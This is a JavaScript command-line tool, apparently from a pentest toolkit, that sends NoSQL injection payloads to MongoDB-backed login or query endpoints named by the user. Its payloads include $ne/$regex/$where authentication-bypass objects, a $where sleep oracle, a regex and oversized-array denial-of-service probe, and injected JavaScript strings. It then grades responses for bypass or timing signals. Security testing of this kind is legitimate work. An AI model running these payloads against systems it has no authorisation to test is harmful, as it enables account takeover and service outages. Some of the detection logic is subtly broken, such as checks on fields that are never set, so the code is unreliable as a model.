// nosqli.js — NoSQL injection tester for MongoDB-backed endpoints.
// Copyright (c) 2026 0xnothings
// @tool nosqli
// @desc Test JSON/query endpoints for NoSQL injection: operator injection, array coercion, $where and $regex probes
// @usage node tools/nosqli.js https://target/api/login --json
// @tags security,web,injection
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`nosqli — NoSQL injection tester

  node tools/nosqli.js <url|list.txt|-> [options]

  --method <m>     HTTP method (default: POST)
  --field <f>      JSON field to inject into (default: username)
  --extra <json>   additional JSON body fields, e.g. '{"password":"x"}'
  --param <p>      query-string parameter for GET-style injection
  --content-type <c> request content type (default: application/json)
  --baseline <n>   baseline samples for timing/behaviour comparison (default: 3)
  --timeout <ms>   per-request timeout (default: 8000)
  --delay <ms>     delay between requests (default: 100)
  --json           machine-readable output
  -h, --help       this text

  Detections: auth bypass (status/body differential), $regex timing oracle,
  $where sleep oracle, oversized-array DoS indicator, operator error leakage.`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };
const timeout = num(get(o, 'timeout'), 8000);
const delay = num(get(o, 'delay'), 100);
const baselineN = num(get(o, 'baseline'), 3);
const method = String(get(o, 'method', 'POST')).toUpperCase();
const field = String(get(o, 'field', 'username'));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let extra = {};
if (o.f.extra) { try { extra = JSON.parse(String(o.f.extra)); } catch { die('--extra must be valid JSON'); } }

// Injection candidates: each is {id, value, class, expect}
function candidates(fieldName) {
  const f = fieldName;
  return [
    { id: 'ne-operator', cls: 'operator-injection', value: { [f]: { $ne: null } }, expect: 'bypass' },
    { id: 'gt-operator', cls: 'operator-injection', value: { [f]: { $gt: '' } }, expect: 'bypass' },
    { id: 'regex-true', cls: 'regex-injection', value: { [f]: { $regex: '.*' } }, expect: 'bypass' },
    { id: 'regex-anchored', cls: 'regex-injection', value: { [f]: { $regex: '^.*$' } }, expect: 'bypass' },
    { id: 'regex-dos', cls: 'regex-dos', value: { [f]: { $regex: '^(a+)+$' } }, expect: 'timing' },
    { id: 'where-sleep', cls: 'where-injection', value: { [f]: { $where: 'sleep(3000)||true' } }, expect: 'timing' },
    { id: 'where-true', cls: 'where-injection', value: { [f]: { $where: 'true' } }, expect: 'bypass' },
    { id: 'exists-true', cls: 'operator-injection', value: { [f]: { $exists: true } }, expect: 'bypass' },
    { id: 'in-array', cls: 'array-coercion', value: { [f]: { $in: ['admin', 'administrator', 'root'] } }, expect: 'bypass' },
    { id: 'array-of-objects', cls: 'array-coercion', value: { [f]: [{ $ne: null }, { $ne: null }] }, expect: 'error' },
    { id: 'array-dos', cls: 'array-dos', value: { [f]: new Array(5000).fill('a') }, expect: 'error' },
    { id: 'type-juggling', cls: 'type-juggling', value: { [f]: true }, expect: 'bypass' },
    { id: 'null-value', cls: 'type-juggling', value: { [f]: null }, expect: 'error' },
    { id: 'string-operator', cls: 'string-injection', value: { [f]: '{"$ne":null}' }, expect: 'bypass' },
    { id: 'comment-injection', cls: 'comment-injection', value: { [f]: 'admin\'||\'1\'==\'1' }, expect: 'bypass' },
    { id: 'js-object-string', cls: 'string-injection', value: { [f]: "admin'; return true; var x='" }, expect: 'bypass' },
  ];
}

async function req(url, opts) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeout);
  const started = Date.now();
  try {
    const r = await fetch(url, { ...opts, signal: ctl.signal, redirect: 'manual' });
    const body = await r.text();
    return { ms: Date.now() - started, status: r.status, body: body.slice(0, 4000), len: body.length, headers: Object.fromEntries([...r.headers].map(([k, v]) => [k.toLowerCase(), v])), error: null };
  } catch (e) {
    return { ms: Date.now() - started, status: 0, body: '', len: 0, error: e.name === 'AbortError' ? 'timeout' : (e.message || 'failed') };
  } finally { clearTimeout(t); }
}

function sig(res) {
  // Lightweight response signature: status + length bucket + a hash of the body minus obvious noise.
  const body = res.body || '';
  let h = 0;
  for (let i = 0; i < body.length; i++) { h = (h * 31 + body.charCodeAt(i)) | 0; }
  return `${res.status}|${Math.round(res.len / 50)}|${(h >>> 0).toString(16).slice(0, 6)}`;
}

function sendInjection(url, value, useQuery) {
  const headers = { 'user-agent': 'nosqli/1.0' };
  if (useQuery) {
    const qs = new URLSearchParams();
    for (const [k, v] of Object.entries(extra)) qs.set(k, String(v));
    qs.set(field, typeof value[field] === 'object' ? JSON.stringify(value[field]) : String(value[field]));
    const u = new URL(url);
    for (const [k, v] of qs) u.searchParams.set(k, v);
    return req(u.toString(), { method: 'GET', headers });
  }
  headers['content-type'] = String(get(o, 'content-type', 'application/json'));
  const bodyObj = { ...extra, ...value };
  return req(url, { method, headers, body: JSON.stringify(bodyObj) });
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) {
  if (e === '-' || /\.txt$/.test(e)) urls.push(...(await inputLines(e)));
  else urls.push(e);
}
urls = [...new Set(urls.filter(Boolean).map((u) => (/^https?:\/\//.test(u) ? u : `https://${u}`)))];
if (!urls.length) die('no URL given');

const useQuery = method === 'GET' || !!o.f.param;
const results = [];

for (const url of urls) {
  const baselines = [];
  for (let i = 0; i < baselineN; i++) {
    const rec = useQuery ? await sendInjection(url, { [field]: 'baseline_zzz' }, true) : await sendInjection(url, { [field]: 'baseline_zzz' }, false);
    baselines.push({ ...rec, sig: sig(rec) });
    await sleep(delay);
  }
  const baselineSig = baselines[0].sig;
  const baselineMs = baselines.reduce((n, b) => n + b.ms, 0) / baselines.length;
  const baselineLen = baselines.reduce((n, b) => n + b.len, 0) / baselines.length;
  const baselineStatus = baselines[0].status;

  const findings = [];
  const all = [];
  for (const c of candidates(field)) {
    const res = useQuery ? await sendInjection(url, c.value, true) : await sendInjection(url, c.value, false);
    const s = sig(res);
    const ev = [];
    let verdict = null;

    if (res.error) {
      all.push({ url, id: c.id, cls: c.cls, status: 0, ms: res.ms, verdict: null, evidence: [`request error: ${res.error}`], error: res.error });
      await sleep(delay);
      continue;
    }

    const different = s !== baselineSig;
    const statusChanged = res.status !== baselineStatus;
    const grew = res.len > baselineLen * 1.4 && res.len - baselineLen > 60;
    const slow = res.ms > baselineMs * 3 && res.ms - baselineMs > 1200;

    if (statusChanged && /^(2\d\d)$/.test(String(res.status)) && !/^(2\d\d)$/.test(String(baselineStatus))) {
      ev.push(`status ${baselineStatus} -> ${res.status} with injection payload`);
      verdict = 'HIGH';
    }
    if (different && res.score !== undefined) ev.push('response signature changed');
    if (grew) { ev.push(`response grew ${baselineLen} -> ${res.len} bytes`); verdict = verdict || 'MEDIUM'; }
    if (slow && c.expect === 'timing') { ev.push(`time-based oracle: ${res.ms}ms vs baseline ${Math.round(baselineMs)}ms`); verdict = 'CRITICAL'; }
    if (slow && !c.expect) { ev.push(`latency spike ${res.ms}ms vs baseline ${Math.round(baselineMs)}ms`); verdict = verdict || 'LOW'; }
    if (/MongoError|MongoServerError|\$where is not allowed|unknown operator|CastError|BSONTypeError|ObjectParameterError/i.test(res.body)) {
      ev.push(`mongo error surfaced: ${(res.body.match(/MongoError|MongoServerError|\$where is not allowed|unknown operator|CastError|BSONTypeError|ObjectParameterError/i) || [])[0]}`);
      verdict = verdict || 'HIGH';
    }
    if (different && c.cls === 'operator-injection' && verdict === null) { ev.push('response differs from baseline for operator payload'); verdict = 'LOW'; }

    all.push({ url, id: c.id, cls: c.cls, status: res.status, ms: res.ms, len: res.len, sig: s, baseline_sig: baselineSig, verdict, evidence: ev, sample: res.body.slice(0, 200) });
    if (verdict) findings.push(all[all.length - 1]);
    await sleep(delay);
  }

  results.push({
    url, method: useQuery ? 'GET' : method, field,
    baseline: { status: baselineStatus, ms: Math.round(baselineMs), len: Math.round(baselineLen), sig: baselineSig, samples: baselineN },
    tests: all, findings,
  });
}

if (flag(o, 'json')) {
  console.log(JSON.stringify({ generated: new Date().toISOString(), results }, null, 2));
  exitSoon(results.some((r) => r.findings.length) ? 1 : 0);
}

for (const r of results) {
  console.log(`\n### ${r.url}  (${r.method}, field=${r.field})`);
  console.log(`baseline: status ${r.baseline.status}, ${r.baseline.ms}ms, ${r.baseline.len} bytes, sig ${r.baseline.sig}`);
  console.log(table(r.tests.map((t) => ({
    payload: t.id, class: t.cls, status: t.status, ms: t.ms, bytes: t.len ?? '',
    verdict: t.verdict || '-', evidence: (t.evidence[0] || '').slice(0, 48),
  }))));
  if (r.findings.length) {
    console.log(`FINDINGS (${r.findings.length}):`);
    for (const f of r.findings) console.log(`  [${f.verdict}] ${f.id} (${f.cls}): ${f.evidence.join('; ')}`);
  } else {
    console.log('no injection indicators — all payloads behaved like the baseline');
  }
}
const total = results.reduce((n, r) => n + r.findings.length, 0);
console.log(`\n${results.length} endpoint(s), ${total} indicator(s)`);
exitSoon(total ? 1 : 0);
